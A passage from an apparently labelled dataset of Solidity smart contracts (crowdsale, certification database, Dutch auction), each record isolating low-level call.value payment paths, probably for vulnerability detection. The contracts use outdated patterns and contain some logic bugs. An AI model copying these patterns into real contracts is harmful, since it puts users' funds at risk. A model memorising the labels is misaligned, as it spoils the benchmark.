registry.getContributionETH(currentParticipantAddress); EthAmount -=  EthAmount * (percentage / 100 * currentStage); currentParticipantAddress.transfer(EthAmount); EthRefunded(currentParticipantAddress, EthAmount); hasWithdrawedEth[currentParticipantAddress] = true; } nextContributorToTransferEth += 1; } } function() public payable { } function getWithdrawed(address contrib) public onlyPermitted view returns (bool) { return hasWithdrawedEth[contrib]; } } contract Crowdsale is Pausable, ETHPriceWatcher, ERC223ReceivingContract { using SafeMath for uint256; UnityToken public token; Hold hold; ConvertQuote convert; Registry registry; enum SaleState  {NEW, SALE, ENDED, REFUND} uint public softCap; uint public hardCap; uint public hardCapToken; uint public startDate; uint public endDate; uint public ethUsdPrice; uint public tokenUSDRate; uint private ethRaised; uint private usdRaised; uint private totalTokens; uint public withdrawedTokens; uint public minimalContribution; bool releasedTokens; BuildingStatus public statusI; PermissionManager public permissionManager; uint private minimumTokensToStart; SaleState public state; uint private nextContributorToClaim; uint private nextContributorToTransferTokens; mapping(address => bool) private hasWithdrawedTokens; mapping(address => bool) private hasRefunded; event CrowdsaleStarted(uint blockNumber); event CrowdsaleEnded(uint blockNumber); event SoftCapReached(uint blockNumber); event HardCapReached(uint blockNumber); event ContributionAdded(address contrib, uint amount, uint amusd, uint tokens, uint ethusdrate); event ContributionAddedManual(address contrib, uint amount, uint amusd, uint tokens, uint ethusdrate); event ContributionEdit(address contrib, uint amount, uint amusd, uint tokens, uint ethusdrate); event ContributionRemoved(address contrib, uint amount, uint amusd, uint tokens); event TokensTransfered(address contributor, uint amount); event Refunded(address ref, uint amount); event ErrorSendingETH(address to, uint amount); event WithdrawedEthToHold(uint amount); event ManualChangeStartDate(uint beforeDate, uint afterDate); event ManualChangeEndDate(uint beforeDate, uint afterDate); event TokensTransferedToHold(address hold, uint amount); event TokensTransferedToOwner(address hold, uint amount); event ChangeMinAmount(uint oldMinAmount, uint minAmount); event ChangePreSale(address preSale); event ChangeTokenUSDRate(uint oldTokenUSDRate, uint tokenUSDRate); event ChangeHardCapToken(uint oldHardCapToken, uint newHardCapToken); event SoftCapChanged(); event HardCapChanged(); modifier onlyPermitted() { require(permissionManager.isPermitted(msg.sender) || msg.sender == owner); _; } function Crowdsale( address tokenAddress, address registryAddress, address _permissionManager, uint start, uint end, uint _softCap, uint _hardCap, address holdCont, uint _ethUsdPrice) public { token = UnityToken(tokenAddress); permissionManager = PermissionManager(_permissionManager); state = SaleState.NEW; startDate = start; endDate = end; minimalContribution = 0.3 * 1 ether; tokenUSDRate = 44500; releasedTokens = false; softCap = _softCap * 1 ether; hardCap = _hardCap * 1 ether; hardCapToken = 100000 * 1 ether; ethUsdPrice = _ethUsdPrice; hold = Hold(holdCont); registry = Registry(registryAddress); } function setPermissionManager(address _permadr) public onlyOwner { require(_permadr != 0x0); permissionManager = PermissionManager(_permadr); } function setRegistry(address _regadr) public onlyOwner { require(_regadr != 0x0); registry = Registry(_regadr); } function setTokenUSDRate(uint _tokenUSDRate) public onlyOwner { require(_tokenUSDRate > 0); uint oldTokenUSDRate = tokenUSDRate; tokenUSDRate = _tokenUSDRate; ChangeTokenUSDRate(oldTokenUSDRate, _tokenUSDRate); } function getTokenUSDRate() public view returns (uint) { return tokenUSDRate; } function receiveEthPrice(uint _ethUsdPrice) external onlyEthPriceProvider { require(_ethUsdPrice > 0); ethUsdPrice = _ethUsdPrice; } function setEthPriceProvider(address provider) external onlyOwner { require(provider != 0x0); ethPriceProvider = provider; } function setHold(address holdCont) public onlyOwner { require(holdCont != 0x0); hold = Hold(holdCont); } function setToken(address tokCont) public onlyOwner { require(tokCont != 0x0); token = UnityToken(tokCont); } function setStatusI(address statI) public onlyOwner { require(statI != 0x0); statusI = BuildingStatus(statI); } function setStartDate(uint date) public onlyOwner { uint oldStartDate = startDate; startDate = date; ManualChangeStartDate(oldStartDate, date); } function setEndDate(uint date) public onlyOwner { uint oldEndDate = endDate; endDate = date; ManualChangeEndDate(oldEndDate, date); } function setSoftCap(uint _softCap) public onlyOwner { softCap = _softCap * 1 ether; SoftCapChanged(); } function setHardCap(uint _hardCap) public onlyOwner { hardCap = _hardCap * 1 ether; HardCapChanged(); } function setMinimalContribution(uint minimumAmount) public onlyOwner { uint oldMinAmount = minimalContribution; minimalContribution = minimumAmount; ChangeMinAmount(oldMinAmount, minimalContribution); } function setHardCapToken(uint _hardCapToken) public onlyOwner { require(_hardCapToken > 1 ether); uint oldHardCapToken = _hardCapToken; hardCapToken = _hardCapToken; ChangeHardCapToken(oldHardCapToken, hardCapToken); } function() whenNotPaused public payable { require(state == SaleState.SALE); require(now >= startDate); require(msg.value >= minimalContribution); bool ckeck = checkCrowdsaleState(msg.value); if(ckeck) { processTransaction(msg.sender, msg.value); } else { msg.sender.transfer(msg.value); } } function checkCrowdsaleState(uint _amount) internal returns (bool) { uint usd = _amount.mul(ethUsdPrice); if (usdRaised.add(usd) >= hardCap) { state = SaleState.ENDED; statusI.setStatus(BuildingStatus.statusEnum.preparation_works); HardCapReached(block.number); CrowdsaleEnded(block.number); return true; } if (now > endDate) { if (usdRaised.add(usd) >= softCap) { state = SaleState.ENDED; statusI.setStatus(BuildingStatus.statusEnum.preparation_works); CrowdsaleEnded(block.number); return false; } else { state = SaleState.REFUND; statusI.setStatus(BuildingStatus.statusEnum.refund); CrowdsaleEnded(block.number); return false; } } return true; } function processTransaction(address _contributor, uint _amount) internal { require(msg.value >= minimalContribution); uint maxContribution = calculateMaxContributionUsd(); uint contributionAmountUsd = _amount.mul(ethUsdPrice); uint contributionAmountETH = _amount; uint returnAmountETH = 0; if (maxContribution < contributionAmountUsd) { contributionAmountUsd = maxContribution; uint returnAmountUsd = _amount.mul(ethUsdPrice) - maxContribution; returnAmountETH = contributionAmountETH - returnAmountUsd.div(ethUsdPrice); contributionAmountETH = contributionAmountETH.sub(returnAmountETH); } if (usdRaised + contributionAmountUsd >= softCap && softCap > usdRaised) { SoftCapReached(block.number); } uint tokens = contributionAmountUsd.div(tokenUSDRate); if(totalTokens + tokens > hardCapToken) { _contributor.transfer(_amount); } else { if (tokens > 0) { registry.addContribution(_contributor, contributionAmountETH, contributionAmountUsd, tokens, ethUsdPrice); ethRaised += contributionAmountETH; totalTokens += tokens; usdRaised += contributionAmountUsd; ContributionAdded(_contributor, contributionAmountETH, contributionAmountUsd, tokens, ethUsdPrice); } } if (returnAmountETH != 0) { _contributor.transfer(returnAmountETH); } } function refundTransaction(bool _stateChanged) internal { if (_stateChanged) { msg.sender.transfer(msg.value); } else{ revert(); } } function getTokensIssued() public view returns (uint) { return totalTokens; } function getTotalUSDInTokens() public view returns (uint) { return totalTokens.mul(tokenUSDRate); } function getUSDRaised() public view returns (uint) { return usdRaised; } function calculateMaxContributionUsd() public constant returns (uint) { return hardCap - usdRaised; } function calculateMaxTokensIssued() public constant returns (uint) { return hardCapToken - totalTokens; } function calculateMaxEthIssued() public constant returns (uint) { return hardCap.mul(ethUsdPrice) - usdRaised.mul(ethUsdPrice); } function getEthRaised() public view returns (uint) { return ethRaised; } function checkBalanceContract() internal view returns (uint) { return token.balanceOf(this); } function getContributorTokens(address contrib) public view returns (uint) { return registry.getContributionTokens(contrib); } function getContributorETH(address contrib) public view returns (uint) { return registry.getContributionETH(contrib); } function getContributorUSD(address contrib) public view returns (uint) { return registry.getContributionUSD(contrib); } function batchReturnUNT(uint _numberOfReturns) public onlyOwner whenNotPaused { require((now > endDate && usdRaised >= softCap )  || ( usdRaised >= hardCap)  ); require(state == SaleState.ENDED); require(_numberOfReturns > 0); address currentParticipantAddress; for (uint cnt = 0; cnt < _numberOfReturns; cnt++) { currentParticipantAddress = registry.getContributorByIndex(nextContributorToTransferTokens); if (currentParticipantAddress == 0x0) return; if (!hasWithdrawedTokens[currentParticipantAddress] && registry.isActiveContributor(currentParticipantAddress)) { uint numberOfUNT = registry.getContributionTokens(currentParticipantAddress); if(token.transfer(currentParticipantAddress, numberOfUNT)) { TokensTransfered(currentParticipantAddress, numberOfUNT); withdrawedTokens += numberOfUNT; hasWithdrawedTokens[currentParticipantAddress] = true; } } nextContributorToTransferTokens += 1; } } function getTokens() public whenNotPaused { require((now > endDate && usdRaised >= softCap )  || ( usdRaised >= hardCap)  ); require(state == SaleState.ENDED); require(!hasWithdrawedTokens[msg.sender] && registry.isActiveContributor(msg.sender)); require(getTokenBalance() >= registry.getContributionTokens(msg.sender)); uint numberOfUNT = registry.getContributionTokens(msg.sender); if(token.transfer(msg.sender, numberOfUNT)) { TokensTransfered(msg.sender, numberOfUNT); withdrawedTokens += numberOfUNT; hasWithdrawedTokens[msg.sender] = true; } } function getOverTokens() public onlyOwner { require(checkBalanceContract() > (totalTokens - withdrawedTokens)); uint balance = checkBalanceContract() - (totalTokens - withdrawedTokens); if(balance > 0) { if(token.transfer(msg.sender, balance)) { TokensTransfered(msg.sender,  balance); } } } function refund() public whenNotPaused { require(state == SaleState.REFUND); require(registry.getContributionETH(msg.sender) > 0); require(!hasRefunded[msg.sender]); uint ethContributed = registry.getContributionETH(msg.sender); if (!msg.sender.send(ethContributed)) { ErrorSendingETH(msg.sender, ethContributed); } else { hasRefunded[msg.sender] = true; Refunded(msg.sender, ethContributed); } } function withdrawEth() public onlyOwner { require(state == SaleState.ENDED); uint bal = this.balance; hold.transfer(bal); hold.setInitialBalance(bal); WithdrawedEthToHold(bal); } function newCrowdsale() public onlyOwner { state = SaleState.NEW; } function startCrowdsale() public onlyOwner { require(now > startDate && now <= endDate); require(state == SaleState.NEW); statusI.setStatus(BuildingStatus.statusEnum.crowdsale); state = SaleState.SALE; CrowdsaleStarted(block.number); } function hasEnded() public constant returns (bool) { return now > endDate || state == SaleState.ENDED; } function getTokenBalance() public constant returns (uint) { return token.balanceOf(this); } function getSoftCap() public view returns (uint) { return softCap; } function getHardCap() public view returns (uint) { return hardCap; } function getStartDate() public view returns (uint) { return startDate; } function getEndDate() public view returns (uint) { return endDate; } function getContributorAmount() public view returns (uint) { return registry.getContributorAmount(); } function getWithdrawed(address contrib) public view returns (bool) { return hasWithdrawedTokens[contrib]; } function getRefunded(address contrib) public view returns (bool) { return hasRefunded[contrib]; } function addContributor(address _contributor, uint _amount, uint _amusd, uint _tokens, uint _quote) public onlyPermitted { registry.addContributor(_contributor, _amount, _amusd, _tokens, _quote); ethRaised += _amount; usdRaised += _amusd; totalTokens += _tokens; ContributionAddedManual(_contributor, ethRaised, usdRaised, totalTokens, _quote); } function editContribution(address _contributor, uint _amount, uint _amusd, uint _tokens, uint _quote) public onlyPermitted { ethRaised -= registry.getContributionETH(_contributor); usdRaised -= registry.getContributionUSD(_contributor); totalTokens -= registry.getContributionTokens(_contributor); registry.editContribution(_contributor, _amount, _amusd, _tokens, _quote); ethRaised += _amount; usdRaised += _amusd; totalTokens += _tokens; ContributionAdded(_contributor, ethRaised, usdRaised, totalTokens, _quote); } function removeContributor(address _contributor) public onlyPermitted { registry.removeContribution(_contributor); ethRaised -= registry.getContributionETH(_contributor); usdRaised -= registry.getContributionUSD(_contributor); totalTokens -= registry.getContributionTokens(_contributor); ContributionRemoved(_contributor, ethRaised, usdRaised, totalTokens); } } "}
{"sol name": "30337.sol", "label": 0, "first path": "function withdrawPayments()  external   returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; success = true; ", "second path": "function withdrawPayments()  external   returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; success = true; ", "third path": "function withdrawPayments()  external   returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; success = true; ", "long path": "pragma solidity ^0.4.2; contract OwnedI { event LogOwnerChanged(address indexed previousOwner, address indexed newOwner); function getOwner() constant returns (address); function setOwner(address newOwner) returns (bool success); } contract Owned is OwnedI { address private owner; function Owned() { owner = msg.sender; } modifier fromOwner { if (msg.sender != owner) { throw; } _; } function getOwner() constant returns (address) { return owner; } function setOwner(address newOwner) fromOwner returns (bool success) { if (newOwner == 0) { throw; } if (owner != newOwner) { LogOwnerChanged(owner, newOwner); owner = newOwner; } success = true; } } contract WithBeneficiary is Owned { address private beneficiary; event LogBeneficiarySet(address indexed previousBeneficiary, address indexed newBeneficiary); function WithBeneficiary(address _beneficiary) payable { if (_beneficiary == 0) { throw; } beneficiary = _beneficiary; if (msg.value > 0) { asyncSend(beneficiary, msg.value); } } function asyncSend(address dest, uint amount) internal; function getBeneficiary() constant returns (address) { return beneficiary; } function setBeneficiary(address newBeneficiary) fromOwner returns (bool success) { if (newBeneficiary == 0) { throw; } if (beneficiary != newBeneficiary) { LogBeneficiarySet(beneficiary, newBeneficiary); beneficiary = newBeneficiary; } success = true; } function () payable { asyncSend(beneficiary, msg.value); } } contract WithFee is WithBeneficiary { uint256 private queryFee; event LogQueryFeeSet(uint256 previousQueryFee, uint256 newQueryFee); function WithFee( address beneficiary, uint256 _queryFee) WithBeneficiary(beneficiary) { queryFee = _queryFee; } modifier requestFeePaid { if (msg.value < queryFee) { throw; } asyncSend(getBeneficiary(), msg.value); _; } function getQueryFee() constant returns (uint256) { return queryFee; } function setQueryFee(uint256 newQueryFee) fromOwner returns (bool success) { if (queryFee != newQueryFee) { LogQueryFeeSet(queryFee, newQueryFee); queryFee = newQueryFee; } success = true; } } contract PullPaymentCapable { uint256 private totalBalance; mapping(address => uint256) private payments; event LogPaymentReceived(address indexed dest, uint256 amount); function PullPaymentCapable() { if (0 < this.balance) { asyncSend(msg.sender, this.balance); } } function asyncSend(address dest, uint256 amount) internal { if (amount > 0) { totalBalance += amount; payments[dest] += amount; LogPaymentReceived(dest, amount); } } function getTotalBalance() constant returns (uint256) { return totalBalance; } function getPaymentOf(address beneficiary) constant returns (uint256) { return payments[beneficiary]; } function withdrawPayments()  external   returns (bool success) { uint256 payment = payments[msg.sender]; payments[msg.sender] = 0; totalBalance -= payment; if (!msg.sender.call.value(payment)()) { throw; } success = true; } function fixBalance() returns (bool success); function fixBalanceInternal(address dest) internal  returns (bool success) { if (totalBalance < this.balance) { uint256 amount = this.balance - totalBalance; payments[dest] += amount; LogPaymentReceived(dest, amount); } return true; } } contract CertifierDbI { event LogCertifierAdded(address indexed certifier); event LogCertifierRemoved(address indexed certifier); function addCertifier(address certifier) returns (bool success); function removeCertifier(address certifier) returns (bool success); function getCertifiersCount() constant returns (uint count); function getCertifierStatus(address certifierAddr) constant returns (bool authorised, uint256 index); function getCertifierAtIndex(uint256 index) constant returns (address); function isCertifier(address certifier) constant returns (bool isIndeed); } contract CertificationDbI { event LogCertifierDbChanged( address indexed previousCertifierDb, address indexed newCertifierDb); event LogStudentCertified( address indexed student, uint timestamp, address indexed certifier, bytes32 indexed document); event LogStudentUncertified( address indexed student, uint timestamp, address indexed certifier); event LogCertificationDocumentAdded( address indexed student, bytes32 indexed document); event LogCertificationDocumentRemoved( address indexed student, bytes32 indexed document); function getCertifierDb() constant returns (address); function setCertifierDb(address newCertifierDb) returns (bool success); function certify(address student, bytes32 document) returns (bool success); function uncertify(address student) returns (bool success); function addCertificationDocument(address student, bytes32 document) returns (bool success); function addCertificationDocumentToSelf(bytes32 document) returns (bool success); function removeCertificationDocument(address student, bytes32 document) returns (bool success); function removeCertificationDocumentFromSelf(bytes32 document) returns (bool success); function getCertifiedStudentsCount() constant returns (uint count); function getCertifiedStudentAtIndex(uint index) payable returns (address student); function getCertification(address student) payable returns (bool certified, uint timestamp, address certifier, uint documentCount); function isCertified(address student) payable returns (bool isIndeed); function getCertificationDocumentAtIndex(address student, uint256 index) payable returns (bytes32 document); function isCertification(address student, bytes32 document) payable returns (bool isIndeed); } contract CertificationDb is CertificationDbI, WithFee, PullPaymentCapable { CertifierDbI private certifierDb; struct DocumentStatus { bool isValid; uint256 index; } struct Certification { bool certified; uint256 timestamp; address certifier; mapping(bytes32 => DocumentStatus) documentStatuses; bytes32[] documents; uint256 index; } mapping(address => Certification) studentCertifications; address[] certifiedStudents; function CertificationDb( address beneficiary, uint256 certificationQueryFee, address _certifierDb) WithFee(beneficiary, certificationQueryFee) { if (_certifierDb == 0) { throw; } certifierDb = CertifierDbI(_certifierDb); } modifier fromCertifier { if (!certifierDb.isCertifier(msg.sender)) { throw; } _; } function getCertifierDb() constant returns (address) { return certifierDb; } function setCertifierDb(address newCertifierDb) fromOwner returns (bool success) { if (newCertifierDb == 0) { throw; } if (certifierDb != newCertifierDb) { LogCertifierDbChanged(certifierDb, newCertifierDb); certifierDb = CertifierDbI(newCertifierDb); } success = true; } function certify(address student, bytes32 document) fromCertifier returns (bool success) { if (student == 0 || studentCertifications[student].certified) { throw; } bool documentExists = document != 0; studentCertifications[student] = Certification({ certified: true, timestamp: now, certifier: msg.sender, documents: new bytes32[](0), index: certifiedStudents.length }); if (documentExists) { studentCertifications[student].documentStatuses[document] = DocumentStatus({ isValid: true, index: studentCertifications[student].documents.length }); studentCertifications[student].documents.push(document); } certifiedStudents.push(student); LogStudentCertified(student, now, msg.sender, document); success = true; } function uncertify(address student) fromCertifier returns (bool success) { if (!studentCertifications[student].certified || studentCertifications[student].documents.length > 0) { throw; } uint256 index = studentCertifications[student].index; delete studentCertifications[student]; if (certifiedStudents.length > 1) { certifiedStudents[index] = certifiedStudents[certifiedStudents.length - 1]; studentCertifications[certifiedStudents[index]].index = index; } certifiedStudents.length--; LogStudentUncertified(student, now, msg.sender); success = true; } function addCertificationDocument(address student, bytes32 document) fromCertifier returns (bool success) { success = addCertificationDocumentInternal(student, document); } function addCertificationDocumentToSelf(bytes32 document) returns (bool success) { success = addCertificationDocumentInternal(msg.sender, document); } function addCertificationDocumentInternal(address student, bytes32 document) internal returns (bool success) { if (!studentCertifications[student].certified || document == 0) { throw; } Certification certification = studentCertifications[student]; if (!certification.documentStatuses[document].isValid) { certification.documentStatuses[document] = DocumentStatus({ isValid:  true, index: certification.documents.length }); certification.documents.push(document); LogCertificationDocumentAdded(student, document); } success = true; } function removeCertificationDocument(address student, bytes32 document) fromCertifier returns (bool success) { success = removeCertificationDocumentInternal(student, document); } function removeCertificationDocumentFromSelf(bytes32 document) returns (bool success) { success = removeCertificationDocumentInternal(msg.sender, document); } function removeCertificationDocumentInternal(address student, bytes32 document) internal returns (bool success) { if (!studentCertifications[student].certified) { throw; } Certification certification = studentCertifications[student]; if (certification.documentStatuses[document].isValid) { uint256 index = certification.documentStatuses[document].index; delete certification.documentStatuses[document]; if (certification.documents.length > 1) { certification.documents[index] = certification.documents[certification.documents.length - 1]; certification.documentStatuses[certification.documents[index]].index = index; } certification.documents.length--; LogCertificationDocumentRemoved(student, document); } success = true; } function getCertifiedStudentsCount() constant returns (uint256 count) { count = certifiedStudents.length; } function getCertifiedStudentAtIndex(uint256 index) payable requestFeePaid returns (address student) { student = certifiedStudents[index]; } function getCertification(address student) payable requestFeePaid returns (bool certified, uint256 timestamp, address certifier, uint256 documentCount) { Certification certification = studentCertifications[student]; return (certification.certified, certification.timestamp, certification.certifier, certification.documents.length); } function isCertified(address student) payable requestFeePaid returns (bool isIndeed) { isIndeed = studentCertifications[student].certified; } function getCertificationDocumentAtIndex(address student, uint256 index) payable requestFeePaid returns (bytes32 document) { document = studentCertifications[student].documents[index]; } function isCertification(address student, bytes32 document) payable requestFeePaid returns (bool isIndeed) { isIndeed = studentCertifications[student].documentStatuses[document].isValid; } function fixBalance() returns (bool success) { return fixBalanceInternal(getBeneficiary()); } } "}
{"sol name": "2013.sol", "label": 0, "first path": "function executeTransaction(address destination, uint value, bytes data) public onlyOwner{ if (destination.call.value(value)(data)) emit Execution(destination,value,data); else emit ExecutionFailure(destination,value,data); library SafeMath { ", "second path": "function executeTransaction(address destination, uint value, bytes data) public onlyOwner{ if (destination.call.value(value)(data)) emit Execution(destination,value,data); else emit ExecutionFailure(destination,value,data); library SafeMath { ", "third path": "function executeTransaction(address destination, uint value, bytes data) public onlyOwner{ if (destination.call.value(value)(data)) emit Execution(destination,value,data); else emit ExecutionFailure(destination,value,data); library SafeMath { ", "long path": "pragma solidity ^0.4.13; contract OracleInterface { struct PriceData { uint ARTTokenPrice; uint blockHeight; } mapping(uint => PriceData) public historicPricing; uint public index; address public owner; uint8 public decimals; function setPrice(uint price) public returns (uint _index) {} function getPrice() public view returns (uint price, uint _index, uint blockHeight) {} function getHistoricalPrice(uint _index) public view returns (uint price, uint blockHeight) {} event Updated(uint indexed price, uint indexed index); } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20Interface is ERC20Basic { uint8 public decimals; } contract HasNoTokens { function tokenFallback(address from_, uint256 value_, bytes data_) external { from_; value_; data_; revert(); } } contract Ownable { address public owner; event OwnershipRenounced(address indexed previousOwner); event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function renounceOwnership() public onlyOwner { emit OwnershipRenounced(owner); owner = address(0); } function transferOwnership(address _newOwner) public onlyOwner { _transferOwnership(_newOwner); } function _transferOwnership(address _newOwner) internal { require(_newOwner != address(0)); emit OwnershipTransferred(owner, _newOwner); owner = _newOwner; } } contract HasNoEther is Ownable { constructor() public payable { require(msg.value == 0); } function() external { } function reclaimEther() external onlyOwner { owner.transfer(address(this).balance); } } contract DutchAuction is Ownable, HasNoEther, HasNoTokens { using SafeMath for uint256; uint public min_shares_to_sell; uint public max_shares_to_sell; uint public min_share_price; uint public available_shares; bool private fundraise_defined; uint public fundraise_max; state public status = state.pending; enum state { pending, active, ended, decrypted, success, failure } event Started(uint block_number); event BidAdded(uint index); event Ended(uint block_number); event BidDecrypted(uint index, bool it_will_process); event FundraiseDefined(uint min_share_price, uint max); event BidBurned(uint index); event Decrypted(uint blocknumber, uint bids_decrypted, uint bids_burned); event Computed(uint index, uint share_price, uint shares_count); event Assigned(uint index, uint shares, uint executed_amout, uint refunded); event Refunded(uint index, uint refunded); event Success(uint raised, uint share_price, uint delivered_shares); event Failure(uint raised, uint share_price); event Execution(address destination,uint value,bytes data); event ExecutionFailure(address destination,uint value,bytes data); uint public final_share_price; uint public computed_fundraise; uint public final_fundraise; uint public computed_shares_sold; uint public final_shares_sold; uint public winner_bids; uint public assigned_bids; uint public assigned_shares; struct BidData { uint origin_index; uint bid_id; address investor_address; uint share_price; uint shares_count; uint transfer_valuation; uint transfer_token; uint asigned_shares_count; uint executed_amount; bool closed; } uint public bids_sorted_count; uint public bids_sorted_refunded; mapping (uint => BidData) public bids_sorted; uint public bids_burned_count; mapping (uint => uint) public bids_burned; uint public bids_ignored_count; uint public bids_ignored_refunded; mapping (uint => BidData) public bids_ignored; uint public bids_decrypted_count; mapping (uint => uint) public bids_decrypted; uint private bids_reset_count; struct Bid { bytes32 bid_hash; uint art_price; uint art_price_index; bool exist; bool is_decrypted; bool is_burned; bool will_compute; } uint public bids_count; mapping (uint => Bid) public bids; uint public bids_computed_cursor; uint public shares_holders_count; mapping (uint => address) public shares_holders; mapping (address => uint) public shares_holders_balance; OracleInterface oracle; uint public oracle_price_decimals_factor; ERC20Interface art_token_contract; uint public decimal_precission_difference_factor; constructor( uint _min_shares_to_sell, uint _max_shares_to_sell, uint _available_shares, address _oracle, address _art_token_contract ) public { require(_max_shares_to_sell > 0); require(_max_shares_to_sell >= _min_shares_to_sell); require(_available_shares >= _max_shares_to_sell); require(_oracle != address(0x0)); owner = msg.sender; min_shares_to_sell = _min_shares_to_sell; max_shares_to_sell = _max_shares_to_sell; available_shares = _available_shares; oracle = OracleInterface(_oracle); uint256 oracle_decimals = uint256(oracle.decimals()); oracle_price_decimals_factor = 10**oracle_decimals; art_token_contract = ERC20Interface(_art_token_contract); uint256 art_token_decimals = uint256(art_token_contract.decimals()); decimal_precission_difference_factor = 10**(art_token_decimals.sub(oracle_decimals)); } function setFundraiseLimits(uint _min_share_price, uint _fundraise_max) public onlyOwner{ require(!fundraise_defined); require(_min_share_price > 0); require(_fundraise_max > 0); require(status == state.ended); fundraise_max = _fundraise_max; min_share_price = _min_share_price; emit FundraiseDefined(min_share_price,fundraise_max); fundraise_defined = true; } function startAuction() public onlyOwner{ require(status == state.pending); status = state.active; emit Started(block.number); } function endAuction() public onlyOwner{ require(status == state.active); status = state.ended; emit Ended(block.number); } function appendEncryptedBid(bytes32 _bid_hash, uint price_index) public onlyOwner returns (uint index){ require(status == state.active); uint art_price; uint art_price_blockHeight; (art_price, art_price_blockHeight) = oracle.getHistoricalPrice(price_index); bids[bids_count] = Bid(_bid_hash, art_price, price_index, true, false, false, false); index = bids_count; emit BidAdded(bids_count++); } function getBidHash(uint nonce, uint bid_id, address investor_address, uint share_price, uint shares_count) public pure returns(bytes32) { return keccak256(abi.encodePacked(nonce, bid_id, investor_address, share_price, shares_count)); } function burnBid(uint _index) public onlyOwner { require(status == state.ended); require(bids_sorted_count == 0); require(bids[_index].exist == true); require(bids[_index].is_decrypted == false); require(bids[_index].is_burned == false); bids_burned[bids_burned_count] = _index; bids_burned_count++; bids_decrypted[bids_decrypted_count] = _index; bids_decrypted_count++; bids[_index].is_burned = true; emit BidBurned(_index); } function appendDecryptedBid(uint _nonce, uint _index, uint _bid_id, address _investor_address, uint _share_price, uint _shares_count, uint _transfered_token) onlyOwner public { require(status == state.ended); require(fundraise_defined); require(bids[_index].exist == true); require(bids[_index].is_decrypted == false); require(bids[_index].is_burned == false); require(_share_price > 0); require(_shares_count > 0); require(_transfered_token >= convert_valuation_to_art(_shares_count.mul(_share_price),bids[_index].art_price)); if (bids_sorted_count > 0){ BidData memory previous_bid_data = bids_sorted[bids_sorted_count-1]; require(_share_price <= previous_bid_data.share_price); if (_share_price == previous_bid_data.share_price){ require(_index > previous_bid_data.origin_index); } } require( getBidHash(_nonce, _bid_id,_investor_address,_share_price,_shares_count) == bids[_index].bid_hash ); uint _transfer_amount = _share_price.mul(_shares_count); BidData memory bid_data = BidData(_index, _bid_id, _investor_address, _share_price, _shares_count, _transfer_amount, _transfered_token, 0, 0, false); bids[_index].is_decrypted = true; if (_share_price >= min_share_price){ bids[_index].will_compute = true; bids_sorted[bids_sorted_count] = bid_data; bids_sorted_count++; emit BidDecrypted(_index,true); }else{ bids[_index].will_compute = false; bids_ignored[bids_ignored_count] = bid_data; bids_ignored_count++; emit BidDecrypted(_index,false); } bids_decrypted[bids_decrypted_count] = _index; bids_decrypted_count++; if(bids_decrypted_count == bids_count){ emit Decrypted(block.number, bids_decrypted_count.sub(bids_burned_count), bids_burned_count); status = state.decrypted; } } function appendDecryptedBids(uint[] _nonce, uint[] _index, uint[] _bid_id, address[] _investor_address, uint[] _share_price, uint[] _shares_count, uint[] _transfered_token) public onlyOwner { require(_nonce.length == _index.length); require(_index.length == _bid_id.length); require(_bid_id.length == _investor_address.length); require(_investor_address.length == _share_price.length); require(_share_price.length == _shares_count.length); require(_shares_count.length == _transfered_token.length); require(bids_count.sub(bids_decrypted_count) > 0); for (uint i = 0; i < _index.length; i++){ appendDecryptedBid(_nonce[i], _index[i], _bid_id[i], _investor_address[i], _share_price[i], _shares_count[i], _transfered_token[i]); } } function resetAppendDecryptedBids(uint _count) public onlyOwner{ require(status == state.ended); require(bids_decrypted_count > 0); require(_count > 0); if (bids_reset_count == 0){ bids_reset_count = bids_decrypted_count; } uint count = _count; if(bids_reset_count < count){ count = bids_reset_count; } do { bids_reset_count--; bids[bids_decrypted[bids_reset_count]].is_decrypted = false; bids[bids_decrypted[bids_reset_count]].is_burned = false; bids[bids_decrypted[bids_reset_count]].will_compute = false; count--; } while(count > 0); if (bids_reset_count == 0){ bids_sorted_count = 0; bids_ignored_count = 0; bids_decrypted_count = 0; bids_burned_count = 0; } } function computeBids(uint _count) public onlyOwner{ require(status == state.decrypted); require(_count > 0); uint count = _count; if (bids_sorted_count == 0){ status = state.failure; emit Failure(0, 0); return; } require(bids_computed_cursor < bids_sorted_count); BidData memory bid; do{ bid = bids_sorted[bids_computed_cursor]; if (bid.share_price.mul(computed_shares_sold).add(bid.share_price) > fundraise_max){ if(bids_computed_cursor > 0){ bids_computed_cursor--; } bid = bids_sorted[bids_computed_cursor]; break; } computed_shares_sold = computed_shares_sold.add(bid.shares_count); computed_fundraise = bid.share_price.mul(computed_shares_sold); emit Computed(bid.origin_index, bid.share_price, bid.shares_count); bids_computed_cursor++; count--; }while( count > 0 && bids_computed_cursor < bids_sorted_count && ( computed_fundraise < fundraise_max && computed_shares_sold < max_shares_to_sell ) ); if ( bids_computed_cursor == bids_sorted_count || computed_fundraise >= fundraise_max || computed_shares_sold >= max_shares_to_sell ){ final_share_price = bid.share_price; if(computed_shares_sold >= max_shares_to_sell){ computed_shares_sold = max_shares_to_sell; computed_fundraise = final_share_price.mul(computed_shares_sold); winner_bids = bids_computed_cursor; status = state.success; emit Success(computed_fundraise, final_share_price, computed_shares_sold); return; } if(computed_fundraise.add(final_share_price.mul(1)) >= fundraise_max){ computed_fundraise = fundraise_max; winner_bids = bids_computed_cursor; status = state.success; emit Success(computed_fundraise, final_share_price, computed_shares_sold); return; } if (bids_computed_cursor == bids_sorted_count){ if (computed_shares_sold >= min_shares_to_sell){ winner_bids = bids_computed_cursor; status = state.success; emit Success(computed_fundraise, final_share_price, computed_shares_sold); return; }else{ status = state.failure; emit Failure(computed_fundraise, final_share_price); return; } } } } function convert_valuation_to_art(uint _valuation, uint _art_price) view public returns(uint amount){ amount = (( _valuation.mul(oracle_price_decimals_factor) ).div( _art_price )).mul(decimal_precission_difference_factor); } function refundIgnoredBids(uint _count) public onlyOwner{ require(status == state.success || status == state.failure); uint count = _count; if(bids_ignored_count < 